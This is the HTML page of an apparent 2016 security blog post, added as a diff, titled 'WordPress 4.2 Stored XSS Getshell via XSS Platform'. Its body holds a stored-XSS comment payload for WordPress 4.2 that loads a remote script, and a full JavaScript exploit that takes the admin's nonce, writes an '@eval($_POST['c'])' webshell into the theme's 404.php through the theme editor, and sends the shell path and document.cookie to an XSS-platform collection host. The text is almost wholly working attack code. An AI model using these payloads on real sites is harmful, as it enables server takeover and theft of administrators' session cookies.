@@ -1,0 +1,605 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="WordPress,XSS," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="InformationWordPress 4.2 Stored XSS受影响范围：WordPress 4.2, 4.1.2, 4.1.1, 3.9.3匿名评论后管理员前台触发，覆盖率全屏窗口
+POC：1&amp;lt;a title=&amp;apos;x onmouseover=eval(unescape(/with%28document%290%5Bbody.appendChild%28createEleme">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WordPress 4.2 Stored XSS Getshell via XSS Platform">
+<meta property="og:url" content="http://yoursite.com/2016/06/13/WordPress-4-2-Stored-XSS-Getshell-via-XSS-Platform/index.html">
+<meta property="og:site_name" content="xl7dev">
+<meta property="og:description" content="InformationWordPress 4.2 Stored XSS受影响范围：WordPress 4.2, 4.1.2, 4.1.1, 3.9.3匿名评论后管理员前台触发，覆盖率全屏窗口
+POC：1&amp;lt;a title=&amp;apos;x onmouseover=eval(unescape(/with%28document%290%5Bbody.appendChild%28createEleme">
+<meta property="og:updated_time" content="2016-06-22T17:59:30.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="WordPress 4.2 Stored XSS Getshell via XSS Platform">
+<meta name="twitter:description" content="InformationWordPress 4.2 Stored XSS受影响范围：WordPress 4.2, 4.1.2, 4.1.1, 3.9.3匿名评论后管理员前台触发，覆盖率全屏窗口
+POC：1&amp;lt;a title=&amp;apos;x onmouseover=eval(unescape(/with%28document%290%5Bbody.appendChild%28createEleme">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: 'Author'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2016/06/13/WordPress-4-2-Stored-XSS-Getshell-via-XSS-Platform/"/>
+
+  <title> WordPress 4.2 Stored XSS Getshell via XSS Platform | xl7dev </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">xl7dev</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">blog</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Startseite
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archiv
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                WordPress 4.2 Stored XSS Getshell via XSS Platform
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <time itemprop="dateCreated" datetime="2016-06-13T00:56:15+08:00" content="2016-06-13">
+              2016-06-13
+            </time>
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h4 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h4><p>WordPress 4.2 Stored XSS<br>受影响范围：WordPress 4.2, 4.1.2, 4.1.1, 3.9.3<br>匿名评论后管理员前台触发，覆盖率全屏窗口</p>
+<h4 id="POC："><a href="#POC：" class="headerlink" title="POC："></a>POC：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a title=&apos;x onmouseover=eval(unescape(/with%28document%290%5Bbody.appendChild%28createElement%28%27script%27%29%29.src%3D%27http%3A%2f%2ft.cn%2fR5ivC0L%27%5D/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px AAAA...[64kb]..AAAAA&apos;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<h4 id="xsser-me-Platform"><a href="#xsser-me-Platform" class="headerlink" title="xsser.me Platform"></a>xsser.me Platform</h4><p>添加shell参数用于接收webshell地址</p>
+<blockquote>
+<p>javascript code</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">var xmlHttp;var content404,theme,_wpnonce,content,path,x ;</span><br><span class="line">x = document.location.pathname;</span><br><span class="line">path = x.substr(0,x.indexOf(&apos;index.php&apos;));</span><br><span class="line">function createXMLHttpRequest() &#123;</span><br><span class="line">    if (window.ActiveXObject) &#123;</span><br><span class="line">        xmlHttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else if (window.XMLHttpRequest) &#123;</span><br><span class="line">        xmlHttp = new XMLHttpRequest();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function doRequest(url) &#123;</span><br><span class="line">    createXMLHttpRequest();</span><br><span class="line">    xmlHttp.onreadystatechange = handleStateChange;</span><br><span class="line">    xmlHttp.open(&quot;GET&quot;, url, true);</span><br><span class="line">    xmlHttp.send(null);</span><br><span class="line">&#125;</span><br><span class="line">function handleStateChange() &#123;</span><br><span class="line">    if(xmlHttp.readyState == 4 &amp;&amp; xmlHttp.status == 200) &#123;</span><br><span class="line">        content404 = xmlHttp.responseText;</span><br><span class="line">        theme = new RegExp(&quot;&lt;input type=\&quot;hidden\&quot; name=\&quot;theme\&quot; value=\&quot;(.+?)\&quot; /&gt;&quot;).exec(content404)[1]</span><br><span class="line">        _wpnonce = new RegExp(&quot;&lt;input type=\&quot;hidden\&quot; id=\&quot;_wpnonce\&quot; name=\&quot;_wpnonce\&quot; value=\&quot;(.+?)\&quot; /&gt;&quot;).exec(content404)[1]</span><br><span class="line">        content = rhtmlspecialchars(new RegExp(&quot;(:?aria-describedby=\&quot;newcontent-description\&quot;&gt;)([^&lt;]+)&quot;).exec(content404)[2].replace(&apos;&amp;lt;?php&apos;,&quot;&amp;lt;?php\n@eval($_POST[&apos;c&apos;]);&quot;))</span><br><span class="line">//Post code</span><br><span class="line">        var data = &quot;_wpnonce=&quot;+_wpnonce+&quot;&amp;_wp_http_referer=&quot;+encodeURIComponent(window.location.pathname+&quot;?file=404.php&quot;)+&quot;&amp;newcontent=&quot;+encodeURIComponent(content)+&quot;&amp;action=update&amp;file=404.php&amp;theme=&quot;+theme+&quot;&amp;scrollto=0&amp;docs-list=&amp;submit=Update+File&quot;</span><br><span class="line">        doPostRequest(document.location.origin+path+&quot;wp-admin/theme-editor.php&quot;,data)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function rhtmlspecialchars(str) &#123;</span><br><span class="line">    if (typeof(str) == &quot;string&quot;) &#123;</span><br><span class="line">        str = str.replace(/&amp;gt;/ig, &quot;&gt;&quot;);</span><br><span class="line">        str = str.replace(/&amp;lt;/ig, &quot;&lt;&quot;);</span><br><span class="line">        str = str.replace(/&amp;#039;/ig, &quot;&apos;&quot;);</span><br><span class="line">        str = str.replace(/&amp;quot;/ig, &apos;&quot;&apos;);</span><br><span class="line">        str = str.replace(/&amp;amp;/ig, &apos;&amp;&apos;); /* must do &amp;amp; last */</span><br><span class="line">    &#125;</span><br><span class="line">    return str;</span><br><span class="line">&#125;</span><br><span class="line">doRequest(document.location.origin+path+&quot;wp-admin/theme-editor.php/?file=404.php&quot;)</span><br><span class="line">function doPostRequest(url,data) &#123;</span><br><span class="line">    createXMLHttpRequest();</span><br><span class="line">    xmlHttp.onreadystatechange = handleStateChangePost;</span><br><span class="line">    xmlHttp.open(&quot;POST&quot;, url, true);</span><br><span class="line">    xmlHttp.setRequestHeader(&apos;Content-type&apos;,&apos;application/x-www-form-urlencoded&apos;);</span><br><span class="line">    xmlHttp.send(data);</span><br><span class="line">&#125;</span><br><span class="line">function handleStateChangePost() &#123;</span><br><span class="line">    if(xmlHttp.readyState == 4 &amp;&amp; xmlHttp.status == 200) &#123;</span><br><span class="line">        doRequest2(document.location.origin+document.location.pathname+&quot;/index.php?p=9999999999999998888&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function doRequest2(url) &#123;</span><br><span class="line">    createXMLHttpRequest();</span><br><span class="line">    xmlHttp.onreadystatechange = handleStateChange3;</span><br><span class="line">    xmlHttp.open(&quot;GET&quot;, url, true);</span><br><span class="line">    xmlHttp.send(null);</span><br><span class="line">&#125;</span><br><span class="line">function handleStateChange3()</span><br><span class="line">&#123;</span><br><span class="line">    if(xmlHttp.readyState == 4 &amp;&amp; xmlHttp.status == 200) &#123;</span><br><span class="line">        (function()&#123;(new Image).src=&apos;http://youdomain.com/index.php?do=api&amp;id=&#123;projectId&#125;&amp;shell=&apos;+escape(document.location.origin+path+&quot;/wp-content/themes/&quot;+theme+&apos;/404.php&apos;)+&apos;&amp;location=&apos;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return &apos;&apos;&#125;&#125;)())+&apos;&amp;toplocation=&apos;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return &apos;&apos;&#125;&#125;)())+&apos;&amp;cookie=&apos;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return &apos;&apos;&#125;&#125;)())+&apos;&amp;opener=&apos;+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:&apos;&apos;&#125;catch(e)&#123;return &apos;&apos;&#125;&#125;)())&#125;)()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="from"><a href="#from" class="headerlink" title="from"></a>from</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://klikki.fi/adv/wordpress2.html</span><br><span class="line">http://kinozoa.com/blog/wordpress-4-2-comment-field-overflow-exploit/</span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    <div>
+      
+        
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/WordPress-XSS/" rel="tag">#WordPress,XSS</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/06/01/Automatic-deployment-Let-s-Encrypt-Certificate/" rel="next" title="Automatic deployment Let's Encrypt Certificate">
+                <i class="fa fa-chevron-left"></i> Automatic deployment Let's Encrypt Certificate
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/06/14/DNS-exfiltration-with-SQL-Injection/" rel="prev" title="DNS exfiltration with SQL Injection">
+                DNS exfiltration with SQL Injection <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="xl7dev" />
+          <p class="site-author-name" itemprop="name">xl7dev</p>
+          <p class="site-description motion-element" itemprop="description">Information Security</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">43</span>
+              <span class="site-state-item-name">Artikel</span>
+            </a>
+          </div>
+
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">36</span>
+                <span class="site-state-item-name">Tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://blog.knownsec.com" target="_blank" title="Knownsec">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  Knownsec
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://javaweb.org" target="_blank" title="园长">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  园长
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://jeary.org" target="_blank" title="jeary">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  jeary
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.thinkings.org" target="_blank" title="Tr3jer">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  Tr3jer
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#Information"><span class="nav-number">1.</span> <span class="nav-text">Information</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#POC："><span class="nav-number">2.</span> <span class="nav-text">POC：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#xsser-me-Platform"><span class="nav-number">3.</span> <span class="nav-text">xsser.me Platform</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#from"><span class="nav-number">4.</span> <span class="nav-text">from</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xl7dev</span>
+</div>
+
+<div class="powered-by">
+  Erstellt mit  <a class="theme-link" href="http://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+  
+  
+  
+
+  
+
+  
+
+</body>
+</html>
